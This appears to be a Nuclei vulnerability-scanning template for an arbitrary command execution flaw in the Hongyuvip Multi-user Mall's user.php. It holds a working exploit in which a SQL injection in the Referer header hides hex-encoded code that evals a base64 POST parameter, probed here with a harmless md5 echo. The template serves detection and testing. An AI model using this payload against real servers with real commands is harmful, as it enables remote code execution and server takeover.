id: hongyuvip-mall-command-execution
info:
  name: Hongyuvip Multi-user Mall Arbitrary Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Hongyuvip Multi-user Mall user.php is vulnerable to arbitrary command execution, allowing attackers to execute code, write backdoors, and control the server.
  tags: command-execution
http:
  - raw:
      - |
        GET /test.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "test"
        part: body
  - raw:
      - |
        POST /user.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:233:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b6576616c09286261736536345f6465636f64650928275a585a686243686959584e6c4e6a52665a47566a6232526c4b435266554539545646747961574e7258536b704f773d3d2729293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca

        action=login&rick={{base64("echo(md5(1));")}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "c4ca4238a0b923820dcc509a6f75849b"
        part: body
